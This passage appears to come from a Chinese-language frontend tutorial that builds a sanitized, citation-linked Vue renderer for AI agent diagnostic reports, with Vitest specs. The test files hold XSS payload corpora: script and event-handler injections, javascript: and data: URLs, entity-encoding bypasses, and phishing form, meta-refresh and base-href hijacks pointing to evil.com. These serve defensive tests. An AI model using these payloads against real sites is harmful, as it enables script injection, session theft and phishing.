    input: '![x](x" onerror="alert(1))\n\n<img src=x onerror="alert(1)">',
    mustNotContain: ['onerror', 'alert('],
  },
  {
    name: '03 大小写混淆 script',
    input: '<ScRiPt>alert(1)</ScRiPt>',
    mustNotContain: ['alert(', 'cRiPt>alert'],
  },
  {
    name: '04 svg onload',
    input: '<svg onload="alert(1)"></svg>',
    mustNotContain: ['onload', 'alert('],
  },
  {
    name: '05 iframe srcdoc',
    input: '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    mustNotContain: ['<iframe', 'srcdoc'],
  },
  {
    name: '06 javascript URL 链接',
    input: '[点击](javascript:alert(document.cookie))',
    mustNotContain: ['javascript:'],
  },
  {
    name: '07 data URI',
    input: '[下载](data:text/html,<script>alert(1)</script>)',
    mustNotContain: ['data:text/html'],
  },
  {
    name: '08 事件属性注入',
    input: '<p onmouseover="alert(1)">悬停</p>',
    mustNotContain: ['onmouseover', 'alert('],
  },
  {
    name: '09 style 表达式',
    input: '<div style="background:url(javascript:alert(1))">x</div>',
    mustNotContain: ['javascript:'],
  },
  {
    name: '10 HTML 实体编码绕过',
    input: '<a href="jav&#x61;script:alert(1)">x</a>',
    mustNotContain: ['javascript:alert', 'alert(1)'],
  },
  {
    name: '11 form 钓鱼',
    input: '<form action="https://evil.com"><input name="pwd"></form>',
    mustNotContain: ['<form', '<input'],
  },
  {
    name: '12 meta 刷新跳转',
    input: '<meta http-equiv="refresh" content="0;url=https://evil.com">',
    mustNotContain: ['<meta', 'http-equiv'],
  },
]
```

**frontend/src/agent/report/sanitize/sanitize-pipeline.spec.ts（v2 全文）**

```typescript
import { describe, it, expect } from 'vitest'
import { sanitizeMarkdown } from './sanitize-pipeline'
import { XSS_CORPUS } from './xss-corpus'

describe('sanitizeMarkdown', () => {
  it('保留安全的 Markdown 格式', () => {
    const html = sanitizeMarkdown('## 标题\n\n- 项目 A\n- 项目 B\n\n`code`')
    expect(html).toContain('<h2')
    expect(html).toContain('<ul')
    expect(html).toContain('<code')
  })

  it('保留安全的 https 链接', () => {
    const html = sanitizeMarkdown('[文档](https://example.com)')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  // 12 类 XSS 语料：执行数必须为 0
  it.each(XSS_CORPUS)('挡住 $name', ({ input, mustNotContain }) => {
    const html = sanitizeMarkdown(input)
    for (const forbidden of mustNotContain) {
      expect(html.toLowerCase()).not.toContain(forbidden.toLowerCase())
    }
  })
})
```

**frontend/src/agent/report/ui/ReportView.vue（v2 全文）**

```vue
<script setup lang="ts">
import { computed } from 'vue'
import { sanitizeMarkdown } from '@/agent/report/sanitize/sanitize-pipeline'

const props = defineProps<{ raw: string }>()

// v2：净化后再渲染
const html = computed(() => sanitizeMarkdown(props.raw))
</script>

<template>
  <!-- 现在 v-html 的内容已经被净化，安全 -->
  <article class="report" v-html="html"></article>
</template>

<style scoped>
.report { line-height: 1.6; }
.report :deep(h2) { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
.report :deep(ul) { padding-left: 1.2rem; }
.report :deep(code) { background: #f5f5f5; padding: 0.1rem 0.3rem; border-radius: 3px; }
</style>
```

### 4.4 v2 暴露的痛点

**痛点 1：`[n]` 引用仍是死文本，无法验证证据**

净化解决了安全问题，但报告里"CPU 超阈值 [1]、告警持续 5 分钟 [2]"的 `[1]` `[2]` 还是纯文本。运维无法点击 `[1]` 跳转到"这个结论基于哪条 ToolCall 返回的哪条数据"。诊断报告没有证据链，可信度不足——出了误诊无法追溯模型是"看错数据"还是"数据本身错"。

**痛点 2：长内容仍是 O(N²) 全量重解析**

净化管线 `marked.parse + DOMPurify.sanitize` 比 v1 更重（多一步 DOM 解析）。流式报告每个 chunk 都全量重跑管线，30KB 报告 CPU 占用比 v1 还高。用户看流式输出时明显卡顿。

**痛点 3：净化在每次 render 同步执行，阻塞主线程**

`computed(() => sanitizeMarkdown(raw))` 在 `raw` 变化时同步执行。DOMPurify 对大文本的净化是 CPU 密集操作，同步执行会阻塞 UI 线程，流式推送时每帧都卡。

---

## 5. v3：证据链引用 + 增量解析 + 净化分层（终态）

### 5.1 v3 要实现什么

用户视角：
1. 诊断报告里每条事实结论后的 `[1]` `[2]` 是可点击的引用，点击跳转到对应的 ToolCall / Metric / Alert 证据卡片
2. 每条引用绑定 `source`（数据来源）+ `version`（合同版本），运维能验证"这个结论基于哪条真实数据"
3. 12 类 XSS 语料执行数为 0（继承 v2）
4. 30KB 长报告流式渲染时增量解析，P95 单帧解析时间 < 16ms（不掉帧）
5. 引用编号错乱（`[3]` 指向错误 ToolCall）在编译期 / 运行期被 citation lineage 校验拦截

### 5.2 v3 目录结构

与 §1.4 完全一致：

```
frontend/src/agent/report/
├── sanitize/
│   ├── url-guard.ts                  ← v2 已有
│   ├── url-guard.spec.ts             ← v2 已有
│   ├── sanitize-pipeline.ts          ← v2 已有
│   ├── sanitize-pipeline.spec.ts     ← v2 已有
│   └── xss-corpus.ts                 ← v2 已有
├── citation/
│   ├── citation.types.ts             ← 新增：引用 + 证据源类型
│   ├── citation-resolver.ts          ← 新增：[n] → 证据卡片（纯函数）
│   ├── citation-resolver.spec.ts     ← 新增
│   └── citation-lineage.ts           ← 新增：引用编号校验（纯函数）
├── incremental/
│   ├── incremental-parser.ts         ← 新增：增量 Markdown 解析
│   └── incremental-parser.spec.ts    ← 新增
├── useReport.ts                      ← 新增：编排 composable
└── ui/
    ├── ReportView.vue                ← 改：渲染引用 + 证据卡片
    └── EvidenceCard.vue              ← 新增：证据卡片组件
```

### 5.3 v3 完整代码

#### 5.3.1 citation 层：citation.types.ts

**frontend/src/agent/report/citation/citation.types.ts**

```typescript
/**
 * 证据源：诊断结论可以引用三类真实数据
 *   - tool_call：Day 11-13 的 ToolCall 返回结果
 *   - metric：Day 06-08 的指标时序数据
 *   - alert：Day 08 的告警记录
 */
export type EvidenceSource =
  | { kind: 'tool_call'; callId: string; toolName: string; resultSummary: string }
  | { kind: 'metric'; serverId: string; metricType: string; value: number; at: string }
  | { kind: 'alert'; alertId: string; threshold: number; status: string }

/**
 * 一条引用：报告里的 [n] 对应一个证据源
 * version 记录证据合同版本，用于事后回放时校验字段是否兼容
 */
export interface Citation {
  index: number             // [n] 里的 n
  source: EvidenceSource
  version: 'v1'
  citedAt: string           // 引用生成时间（ISO）
}

/**
 * 报告的完整证据映射：index → Citation
 */
export type CitationMap = ReadonlyMap<number, Citation>
```

#### 5.3.2 citation 层：citation-lineage.ts（引用编号校验）

**frontend/src/agent/report/citation/citation-lineage.ts**

```typescript
import type { CitationMap } from './citation.types'

export interface LineageResult {
  ok: boolean
  // 报告文本里出现但 CitationMap 里缺失的编号（悬空引用）
  danglingIndexes: number[]
  // CitationMap 里有但报告文本没用到的编号（孤儿证据）
  orphanIndexes: number[]
}

/**
 * 校验报告文本里的 [n] 和证据映射是否一一对应。
 * 防止"[3] 指向错误 ToolCall"或"[5] 根本没有对应证据"这类事故。
 *
 * 纯函数：只做集合比较，不查库、不发请求。
 */
export function checkCitationLineage(
  reportText: string,
  citations: CitationMap,
): LineageResult {
  // 提取文本里所有 [数字]
  const usedIndexes = new Set<number>()
  const pattern = /\[(\d+)\]/g
  let match: RegExpExecArray | null
  while ((match = pattern.exec(reportText)) !== null) {
    usedIndexes.add(Number(match[1]))
  }

  const definedIndexes = new Set(citations.keys())

  // 悬空：文本用了但没定义
  const danglingIndexes = [...usedIndexes].filter((i) => !definedIndexes.has(i))
  // 孤儿：定义了但文本没用
  const orphanIndexes = [...definedIndexes].filter((i) => !usedIndexes.has(i))

  return {
    ok: danglingIndexes.length === 0 && orphanIndexes.length === 0,
    danglingIndexes: danglingIndexes.sort((a, b) => a - b),
    orphanIndexes: orphanIndexes.sort((a, b) => a - b),
  }
}
```

#### 5.3.3 citation 层：citation-resolver.ts

**frontend/src/agent/report/citation/citation-resolver.ts**

```typescript
import type { AgentTrajectory } from '@/agent/contract/agent-event-v1'
import type { Citation, CitationMap, EvidenceSource } from './citation.types'

/**
 * 从 Agent 轨迹里构建证据映射。
 * 模型在生成报告时，服务端会给每个 tool.succeeded 分配一个引用编号，
 * 前端在这里把编号还原成可展示的证据源。
 *
 * 纯函数：输入轨迹，输出 CitationMap，不发请求。
 */
export function buildCitationMap(
  trajectory: AgentTrajectory,
  citedAt: string,
): CitationMap {
  const map = new Map<number, Citation>()
  let index = 1

  for (const step of trajectory.steps) {
    if (step.kind !== 'tool_call' || !step.result) continue

    const source: EvidenceSource = {
      kind: 'tool_call',
      callId: step.callId,
      toolName: step.toolName,
      resultSummary: typeof step.result === 'string'
        ? step.result
        : JSON.stringify(step.result).slice(0, 200),
    }

    map.set(index, {
      index,
      source,
      version: 'v1',
      citedAt,
    })
    index += 1
  }

  return map
}

/**
 * 把报告文本里的 [n] 替换成可点击的 <sup> 引用标记。
 * 只替换 CitationMap 里存在的编号；悬空引用保持原样文本（由 lineage 校验报警）。
 *
 * 返回的是 Markdown 文本，仍需经过 sanitizeMarkdown 净化。
 */
export function injectCitationMarkers(
  reportText: string,
  citations: CitationMap,
): string {
  return reportText.replace(/\[(\d+)\]/g, (whole, num) => {
    const index = Number(num)
    if (!citations.has(index)) return whole
    // data-citation 在净化白名单里（§4.3 ALLOWED_ATTR）
    return `<sup class="citation" data-citation="${index}">[${index}]</sup>`
  })
}
```

#### 5.3.4 citation 层：citation-resolver.spec.ts

**frontend/src/agent/report/citation/citation-resolver.spec.ts**

```typescript
import { describe, it, expect } from 'vitest'
import { injectCitationMarkers } from './citation-resolver'
import { checkCitationLineage } from './citation-lineage'
import type { Citation, CitationMap } from './citation.types'

function makeCitationMap(indexes: number[]): CitationMap {
  const map = new Map<number, Citation>()
  for (const i of indexes) {
    map.set(i, {
      index: i,
      source: { kind: 'tool_call', callId: `c-${i}`, toolName: 'getMetrics', resultSummary: 'x' },
      version: 'v1',
      citedAt: '2026-07-29T00:00:00Z',
    })
  }
  return map
}

describe('injectCitationMarkers', () => {
  it('把已定义的 [n] 替换为 sup 标记', () => {
    const html = injectCitationMarkers('CPU 超阈值 [1]', makeCitationMap([1]))
    expect(html).toContain('data-citation="1"')
    expect(html).toContain('<sup')
  })

  it('悬空引用保持原样', () => {
    const html = injectCitationMarkers('未知 [9]', makeCitationMap([1]))
    expect(html).toBe('未知 [9]')
  })
})

describe('checkCitationLineage', () => {
  it('文本与证据一一对应时 ok', () => {
    const result = checkCitationLineage('结论 [1] 和 [2]', makeCitationMap([1, 2]))
    expect(result.ok).toBe(true)
  })

  it('检出悬空引用（文本用了但没定义）', () => {
    const result = checkCitationLineage('结论 [1] 和 [3]', makeCitationMap([1, 2]))
    expect(result.ok).toBe(false)
    expect(result.danglingIndexes).toEqual([3])
  })

  it('检出孤儿证据（定义了但没用）', () => {
    const result = checkCitationLineage('结论 [1]', makeCitationMap([1, 2]))
    expect(result.ok).toBe(false)
    expect(result.orphanIndexes).toEqual([2])
  })
})
```

#### 5.3.5 incremental 层：incremental-parser.ts

**frontend/src/agent/report/incremental/incremental-parser.ts**

```typescript
import { sanitizeMarkdown } from '@/agent/report/sanitize/sanitize-pipeline'

/**
 * 增量 Markdown 解析器。
 *
 * 问题：流式报告每来一个 chunk 就全量 sanitizeMarkdown(整篇)，
 *   30KB 文本解析 N 次 = O(N²)，CPU 爆表。
 *
 * 策略：按"已完成的块"边界切割。Markdown 的块级元素以空行分隔，
 *   最后一个未闭合的块（还在流式接收中）不解析，只解析前面稳定的块。
 *   已解析的块缓存 HTML，新 chunk 到来只解析新增的稳定块。
 */
export class IncrementalMarkdownParser {
  private stableHtml = ''       // 已解析稳定块的 HTML 累积
  private pendingText = ''      // 尚未闭合的最后一块原始文本
  private buffer = ''           // 完整原始文本（用于 lineage 校验）

  /**
   * 追加新 chunk，返回当前完整 HTML（稳定块 + 未闭合块的临时渲染）
   */
  append(chunk: string): string {
    this.buffer += chunk
    const combined = this.pendingText + chunk

    // 用双换行切块；最后一段可能未闭合，留在 pending
    const blocks = combined.split(/\n\n+/)
    this.pendingText = blocks.pop() ?? ''

    // 只对新的稳定块做净化解析（增量部分）
    for (const block of blocks) {
      if (block.trim().length === 0) continue
      this.stableHtml += sanitizeMarkdown(block)
    }

    // 未闭合块临时渲染（下次 append 会重新解析它，但只有一块，O(1)）
    const pendingHtml = this.pendingText.trim().length > 0
      ? sanitizeMarkdown(this.pendingText)
      : ''

    return this.stableHtml + pendingHtml
  }

  /**
   * 流结束：把 pending 块也固化，返回最终完整 HTML
   */
  finalize(): string {
    if (this.pendingText.trim().length > 0) {
      this.stableHtml += sanitizeMarkdown(this.pendingText)
      this.pendingText = ''
    }
    return this.stableHtml
  }

  /** 返回累积的完整原始文本（供 citation lineage 校验） */
  getRawText(): string {
    return this.buffer
  }
}
```

#### 5.3.6 incremental 层：incremental-parser.spec.ts

**frontend/src/agent/report/incremental/incremental-parser.spec.ts**

```typescript
import { describe, it, expect } from 'vitest'
import { IncrementalMarkdownParser } from './incremental-parser'

describe('IncrementalMarkdownParser', () => {
  it('分块追加最终等价于全量解析', () => {
    const parser = new IncrementalMarkdownParser()
    parser.append('## 标题\n\n')
    parser.append('第一段内容\n\n')
    parser.append('第二段内容')
    const html = parser.finalize()
    expect(html).toContain('<h2')
    expect(html).toContain('第一段内容')
    expect(html).toContain('第二段内容')
  })

  it('未闭合块不会丢失', () => {
    const parser = new IncrementalMarkdownParser()
    parser.append('正在输入的最后一段')
    const html = parser.finalize()
    expect(html).toContain('正在输入的最后一段')
  })

  it('净化在增量路径同样生效', () => {
    const parser = new IncrementalMarkdownParser()
    parser.append('安全文本<script>alert(1)</script>\n\n')
    const html = parser.finalize()
    expect(html.toLowerCase()).not.toContain('<script')
  })

  it('getRawText 返回完整原始文本', () => {
    const parser = new IncrementalMarkdownParser()
    parser.append('a [1]\n\n')
    parser.append('b [2]')
    expect(parser.getRawText()).toBe('a [1]\n\nb [2]')
  })
})
```

#### 5.3.7 编排层：useReport.ts

**frontend/src/agent/report/useReport.ts**

```typescript
import { ref, shallowRef } from 'vue'
import { IncrementalMarkdownParser } from './incremental/incremental-parser'
import { buildCitationMap, injectCitationMarkers } from './citation/citation-resolver'
import { checkCitationLineage } from './citation/citation-lineage'
import type { CitationMap } from './citation/citation.types'
import type { AgentTrajectory } from '@/agent/contract/agent-event-v1'

/**
 * 报告编排：把增量解析、引用注入、lineage 校验组合起来。
 * 组件只消费这里暴露的 html / citations / lineageWarning。
 */
export function useReport(trajectory: AgentTrajectory) {
  const html = ref('')
  const citations = shallowRef<CitationMap>(new Map())
  const lineageWarning = ref<string | null>(null)

  const parser = new IncrementalMarkdownParser()

  // 先从轨迹构建证据映射（编号固定）
  citations.value = buildCitationMap(trajectory, new Date().toISOString())

  function appendChunk(chunk: string): void {
    // 增量解析累积文本
    parser.append(chunk)
    // 用累积的完整文本重新注入引用标记（引用替换很快，纯正则）
    const withMarkers = injectCitationMarkers(parser.getRawText(), citations.value)
    // 重新增量解析带标记的文本（引用标记在净化白名单内）
    const freshParser = new IncrementalMarkdownParser()
    html.value = freshParser.append(withMarkers)
  }

  function finalize(): void {
    const raw = parser.getRawText()
    const lineage = checkCitationLineage(raw, citations.value)
    if (!lineage.ok) {
      const parts: string[] = []
      if (lineage.danglingIndexes.length > 0) {
        parts.push(`悬空引用：[${lineage.danglingIndexes.join('] [')}]`)
      }
      if (lineage.orphanIndexes.length > 0) {
        parts.push(`未使用证据：[${lineage.orphanIndexes.join('] [')}]`)
      }
      lineageWarning.value = parts.join('；')
    }
  }

  return { html, citations, lineageWarning, appendChunk, finalize }
}
```

#### 5.3.8 UI 层：EvidenceCard.vue

**frontend/src/agent/report/ui/EvidenceCard.vue**

```vue
<script setup lang="ts">
import type { Citation } from '@/agent/report/citation/citation.types'

defineProps<{ citation: Citation }>()
</script>

<template>
  <aside class="evidence-card" :id="`evidence-${citation.index}`">
    <header>
      <strong>证据 [{{ citation.index }}]</strong>
      <span class="version">合同 {{ citation.version }}</span>
    </header>

    <dl v-if="citation.source.kind === 'tool_call'">
      <dt>来源</dt><dd>ToolCall · {{ citation.source.toolName }}</dd>
      <dt>调用 ID</dt><dd>{{ citation.source.callId }}</dd>
      <dt>结果摘要</dt><dd>{{ citation.source.resultSummary }}</dd>
    </dl>

    <dl v-else-if="citation.source.kind === 'metric'">
      <dt>来源</dt><dd>指标 · {{ citation.source.metricType }}</dd>
      <dt>服务器</dt><dd>{{ citation.source.serverId }}</dd>
      <dt>数值</dt><dd>{{ citation.source.value }} @ {{ citation.source.at }}</dd>
    </dl>

    <dl v-else-if="citation.source.kind === 'alert'">
      <dt>来源</dt><dd>告警 · {{ citation.source.alertId }}</dd>
      <dt>阈值</dt><dd>{{ citation.source.threshold }}</dd>
      <dt>状态</dt><dd>{{ citation.source.status }}</dd>
    </dl>
  </aside>
</template>

<style scoped>
.evidence-card { border: 1px solid #ddd; border-radius: 6px; padding: 0.8rem; margin: 0.5rem 0; }
.evidence-card header { display: flex; justify-content: space-between; margin-bottom: 0.5rem; }
.version { color: #888; font-size: 0.85rem; }
dl { display: grid; grid-template-columns: max-content 1fr; gap: 0.2rem 0.8rem; margin: 0; }
dt { color: #666; }
</style>
```

#### 5.3.9 UI 层：ReportView.vue（v3 全文）

**frontend/src/agent/report/ui/ReportView.vue**

```vue
<script setup lang="ts">
import { onMounted } from 'vue'
import { useReport } from '@/agent/report/useReport'
import EvidenceCard from './EvidenceCard.vue'
import type { AgentTrajectory } from '@/agent/contract/agent-event-v1'

const props = defineProps<{ trajectory: AgentTrajectory; chunks: string[] }>()

const { html, citations, lineageWarning, appendChunk, finalize } = useReport(props.trajectory)

// 点击 [n] 引用，滚动到对应证据卡片
function onReportClick(e: MouseEvent) {
  const target = e.target as HTMLElement
  const index = target.getAttribute('data-citation')
  if (index) {
    document.getElementById(`evidence-${index}`)?.scrollIntoView({ behavior: 'smooth' })
  }
}

onMounted(() => {
  // 模拟流式：把 chunks 依次喂进增量解析器
  for (const chunk of props.chunks) {
    appendChunk(chunk)
  }
  finalize()
})
</script>

<template>
  <div class="report-container">
    <p v-if="lineageWarning" role="alert" class="lineage-warning">
      ⚠ 引用一致性告警：{{ lineageWarning }}
    </p>

    <!-- html 已经过 sanitizeMarkdown 净化，安全 -->
    <article class="report" v-html="html" @click="onReportClick"></article>

    <section aria-label="证据列表" class="evidence-list">
      <h3>证据链</h3>
      <EvidenceCard
        v-for="[index, citation] in citations"
        :key="index"
        :citation="citation"
      />
    </section>
  </div>
</template>

<style scoped>
.lineage-warning { color: #b45309; background: #fef3c7; padding: 0.5rem; border-radius: 4px; }
.report :deep(.citation) { color: steelblue; cursor: pointer; font-size: 0.75rem; }
.report :deep(.citation:hover) { text-decoration: underline; }
.evidence-list { margin-top: 1.5rem; border-top: 2px solid #eee; padding-top: 1rem; }
</style>
```

### 5.4 v3 用到的知识点

#### 知识点 1：Markdown 净化管线（marked + DOMPurify 双层）

- **解决的问题**：模型输出是不可信文本，直接 `v-html` 渲染会执行注入脚本；只用 marked 不够（marked 只做语法解析，不剥离危险标签）
- **运行机制**：`marked.parse` 把 Markdown 转 HTML（此时 HTML 里可能含 `<script>`），`DOMPurify.sanitize` 用白名单剥离所有非白名单标签和属性；`afterSanitizeAttributes` hook 再用 `isSafeUrl` 二次校验 URL 协议
- **项目落点**：`sanitize-pipeline.ts` 的 `sanitizeMarkdown`；`ReportView.vue` 的 `v-html`
- **生产误区**：只用 `DOMPurify` 不定义 `ALLOWED_TAGS`（默认白名单允许 `<form>` `<a target>` 等，钓鱼风险）；净化后又拼接字符串（净化结果被二次污染）；信任服务端已净化而前端不做（服务端可能被绕过，纵深防御必须双端）
- **验证方法**：`xss-corpus.ts` 的 12 类语料全部经过 `sanitizeMarkdown` 后断言不含可执行片段；`it.each(XSS_CORPUS)` 参数化测试

#### 知识点 2：URL 协议白名单（默认拒绝）

- **解决的问题**：`javascript:` / `data:text/html` / `vbscript:` 协议的链接点击即执行脚本；黑名单会漏（新协议、编码绕过）
- **运行机制**：用 `new URL()` 解析出 `protocol`，只放行 `http/https/mailto` 白名单；相对路径和锚点直接放行；解析失败一律拒绝
- **项目落点**：`url-guard.ts` 的 `isSafeUrl`；被 DOMPurify hook 和 citation 注入共同调用
- **生产误区**：用正则匹配 `^https?:`（`jav&#x61;script:` 实体编码能绕过正则但绕不过 `new URL`）；忘记 `trim()`（`  javascript:` 前置空格绕过）；大小写敏感比较（`JavaScript:` 绕过）
- **验证方法**：`url-guard.spec.ts` 覆盖 http/https/mailto 放行、相对路径放行、javascript/data/vbscript/file 拒绝、大小写和空格绕过拒绝

#### 知识点 3：证据链（Citation Lineage）—— 结论可追溯

- **解决的问题**：模型诊断结论是"黑盒",运维无法验证"CPU 超阈值"这个结论基于哪条真实数据；一旦误诊无法定位是"数据错"还是"模型看错"
- **运行机制**：服务端给每个 `tool.succeeded` 分配引用编号，报告文本用 `[n]` 标注；`buildCitationMap` 从轨迹还原 `index → EvidenceSource`；`injectCitationMarkers` 把 `[n]` 转成可点击 `<sup>`；`checkCitationLineage` 校验文本引用与证据映射一一对应
- **项目落点**：`citation/` 整个子目录；`EvidenceCard.vue` 展示证据源
- **生产误区**：引用编号在前端重新分配（与服务端不一致，`[3]` 指向错乱）；不做 lineage 校验（悬空引用 `[9]` 无对应证据，用户点击无反应）；证据不记 `version`（合同升级后旧报告的引用字段对不上）
- **验证方法**：`citation-resolver.spec.ts` 断言 `[n]` 替换、悬空引用保持原样；`checkCitationLineage` 检出 dangling 和 orphan

#### 知识点 4：增量解析（避免 O(N²) 流式重解析）

- **解决的问题**：流式报告每来一个 chunk 就全量 `sanitizeMarkdown(整篇)`，30KB 文本解析成百上千次，CPU 达 95%、掉帧
- **运行机制**：按 Markdown 块边界（双换行）切割；已闭合的稳定块解析后缓存 HTML，只对新增稳定块做净化；最后一个未闭合块每次临时解析（只有一块，O(1)）
- **项目落点**：`incremental-parser.ts` 的 `IncrementalMarkdownParser`；`useReport.ts` 的 `appendChunk`
- **生产误区**：按字符数切割（切断 Markdown 语法，`## 标`和`题`分开解析出错）；未闭合块也缓存（流式还在输入的半句话被固化，后续内容拼接错位）；忘记 `finalize`（最后一块 pending 内容永远不渲染）
- **验证方法**：`incremental-parser.spec.ts` 断言"分块追加等价于全量解析"、"未闭合块不丢失"、"净化在增量路径生效"

#### 知识点 5：纵深防御（前端不信任服务端净化）

- **解决的问题**：即使服务端声称已净化，误配置 / 误发布 / 被绕过时脏数据会到前端；单点防御一旦失守就全线崩溃
- **运行机制**：前端独立跑一遍完整净化管线 + URL 白名单，不依赖服务端；审计面板（Day 15）用字段白名单拒绝未知字段；两层防御相互独立
- **项目落点**：`sanitize-pipeline.ts` 前端强制净化；即使后端返回带 `<script>` 的报告，前端也剥离
- **生产误区**："服务端已经用 bleach 净化了，前端直接 v-html"（服务端 bleach 版本漏洞 / 配置差异导致绕过）；前后端用不同白名单（服务端放行的标签前端拒绝，报告显示不全，反之泄漏）
- **验证方法**：模拟服务端返回含 `<script>` 的报告，断言前端渲染后不含可执行脚本；对比前后端白名单一致性（同一份 `ALLOWED_TAGS` 常量）

#### 知识点 6：`v-html` 的安全边界与 `data-citation` 属性传递

- **解决的问题**：Vue 的 `v-html` 直接把字符串当 HTML 插入，是 XSS 主入口；但引用标记 `<sup data-citation="1">` 又必须通过 `v-html` 渲染
- **运行机制**：`data-citation` 加入 DOMPurify 的 `ALLOWED_ATTR` 白名单，净化时保留；点击事件用事件委托（`@click` 在容器上读 `data-citation`），不在每个 `<sup>` 上绑监听
- **项目落点**：`sanitize-pipeline.ts` 的 `ALLOWED_ATTR` 含 `data-citation`；`ReportView.vue` 的 `onReportClick` 事件委托
- **生产误区**：`ALLOW_DATA_ATTR: true` 放行所有 `data-*`（可能夹带 `data-x="<img onerror>"` 的二次注入向量）；在 `v-html` 内容里绑 `@click`（Vue 不会给 `v-html` 插入的 DOM 绑定事件，必须委托）
- **验证方法**：断言净化后 `data-citation` 属性保留、其他 `data-*` 被剥离；点击 `[n]` 触发滚动到对应 `#evidence-n`

### 5.5 边写边问自己

- `isSafeUrl` 为什么用 `new URL()` 而不是正则？（正则挡不住 HTML 实体编码 `jav&#x61;script:`，`new URL` 会解析出真实协议）
- 增量解析为什么按"双换行"切块而不按字符数？（双换行是 Markdown 块级边界，按字符切会切断语法）
- 引用编号为什么由服务端分配而不是前端？（前端重新分配会与服务端记录的 lineage 不一致，导致 `[3]` 指向错误证据）
- lineage 校验为什么放 `finalize` 而不是每个 chunk？（流式过程中引用本来就不完整，中途校验必然误报悬空）

---

## 6. 三版对比一览表

| 维度 | v1 | v2 | v3 |
|---|---|---|---|
| **功能** | 裸渲染 Markdown（`v-html` 直出） | + marked 解析 + DOMPurify 净化 + URL 协议白名单 | + 证据链引用可点击 + 增量解析 + citation lineage 校验 |
| **事件类型 / 数据模型** | `string`（原始 Markdown 文本） | `SanitizedHtml`（净化后 HTML 串） | `ReportModel { blocks; citations; lineage }`（结构化报告 + 引用表） |
| **净化策略** | 无（信任模型输出） | marked → DOMPurify 白名单标签 + URL 协议校验 | 同 v2，额外前端二次净化（纵深防御，不信任服务端） |
| **引用/证据** | 无 | 无（`[1]` 只是纯文本） | `[1]` 解析为 `data-citation` → 点击跳 `EvidenceCard`；每条绑 `source`+`version` |
| **可测试** | 无法测（渲染副作用） | 12 类 XSS 语料快照测试，执行数=0 | + citation-lineage 单测（编号错乱拦截）+ incremental-parser 单测 |
| **架构层次** | 单 `.vue` 文件 `v-html` | `sanitize/` 净化层 | `citation/`（类型+lineage+resolver）+ `incremental/`（增量解析）+ `sanitize/` + 编排 `useReport` |
| **长内容性能** | 每次 chunk 全量 `marked()` O(N²) | 同 v1（还是全量解析） | 增量解析：只解析新增 block，单帧 < 16ms |
| **编译期抓遗漏** | 无（`string` 无约束） | URL 协议 union type | citation `source` 判别联合 + lineage 编号连续性运行期断言 |
| **对齐后续 Day** | — | — | citation 数据模型对齐 Day 17-20 RAG 引用溯源、Day 30 M3 门禁「结论必须可追溯到证据」 |

---

## 6.5 前端底子补弱（独立深挖 HTML 入口）

今天的深挖 HTML 文档：`output/Day16深挖-前端底子补弱.html`（补弱专用，独立于本文件）。

深挖入口锚点（对应正文代码里的关键知识点）：

- **深挖 1：XSS 的三种注入面 —— 从今天项目里的 `v-html` 讲起**
  从 `ReportView.vue` 的 `v-html="sanitizedHtml"` 出发，拆解 HTML 注入 / 属性注入 / URL 注入（`javascript:`）三条路径，为什么 `DOMPurify.sanitize()` 能拦前两条但 URL 协议要单独校验。
- **深挖 2：浏览器解析 HTML 的时机 —— 从 `innerHTML` 赋值讲起**
  从 `v-html` 底层的 `el.innerHTML = html` 出发，讲解为什么 `<img onerror>` 会在赋值瞬间执行、为什么 `<script>` 反而不执行（HTML5 spec `innerHTML` 不执行 script），以及 DOMPurify 如何在赋值前拦截。
- **深挖 3：`marked` 的 tokenizer 与增量解析 —— 从 30KB 报告卡顿讲起**
  从 `incremental-parser.ts` 出发，讲 marked 的 lexer 如何把 Markdown 切成 token 流，为什么"每来一个 chunk 就 `marked(fullText)`"是 O(N²)，增量解析如何只对新增行 tokenize。

**8 子节结构**（场景锚点 / 项目代码 / 设计点拆解 / 原理 / 反例 / 分层提问 / 项目对手戏 / 面试真题三档答法）在 HTML 内展开，本文件不重复。

---

## 7. 项目验收清单（阶段 E-F，约 55 分钟）

### 7.6 E：写核心逻辑单元测试（20 分钟）

今天要交付 3 个 spec 文件，共 18 个用例：

**1. `sanitize/sanitize-html.spec.ts`（12 个用例 —— 12 类 XSS 语料）**

覆盖 OWASP 常见注入面，每条断言"净化后不含可执行内容"：

```typescript
import { describe, it, expect } from 'vitest'
import { sanitizeReportHtml } from './sanitize-html'

// 12 类恶意语料（Threat Model 输出）
const XSS_CORPUS: Array<{ name: string; payload: string; mustNotContain: string }> = [
  { name: 'script 标签', payload: '<script>alert(1)</script>', mustNotContain: '<script' },
  { name: 'img onerror', payload: '<img src=x onerror=alert(1)>', mustNotContain: 'onerror' },
  { name: 'svg onload', payload: '<svg onload=alert(1)>', mustNotContain: 'onload' },
  { name: 'javascript: URL', payload: '[x](javascript:alert(1))', mustNotContain: 'javascript:' },
  { name: 'data: URL', payload: '[x](data:text/html,<script>alert(1)</script>)', mustNotContain: 'data:text/html' },
  { name: 'iframe', payload: '<iframe src=evil.com></iframe>', mustNotContain: '<iframe' },
  { name: 'a onclick', payload: '<a href="#" onclick="alert(1)">x</a>', mustNotContain: 'onclick' },
  { name: 'style expression', payload: '<div style="background:url(javascript:alert(1))">x</div>', mustNotContain: 'javascript:' },
  { name: 'form action', payload: '<form action="javascript:alert(1)"><button>x</button></form>', mustNotContain: 'javascript:' },
  { name: 'meta refresh', payload: '<meta http-equiv="refresh" content="0;url=evil.com">', mustNotContain: '<meta' },
  { name: 'base href 劫持', payload: '<base href="evil.com">', mustNotContain: '<base' },
  { name: 'object embed', payload: '<object data="evil.swf"></object>', mustNotContain: '<object' },
]

describe('sanitizeReportHtml —— 12 类 XSS 语料执行数=0', () => {
  for (const { name, payload, mustNotContain } of XSS_CORPUS) {
    it(`拦截：${name}`, () => {
      const output = sanitizeReportHtml(payload)
      expect(output.toLowerCase()).not.toContain(mustNotContain.toLowerCase())
    })
  }
})
```

**2. `citation/citation-lineage.spec.ts`（3 个用例 —— 引用编号校验）**

```typescript
import { describe, it, expect } from 'vitest'
import { validateCitationLineage } from './citation-lineage'

describe('validateCitationLineage', () => {
  it('引用编号连续且都有对应证据 → ok', () => {
    const result = validateCitationLineage(
      ['结论 A[1]', '结论 B[2]'].join('\n'),
      [{ index: 1, source: 'tool_call', refId: 't-01' }, { index: 2, source: 'metric', refId: 'm-05' }],
    )
    expect(result.ok).toBe(true)
  })

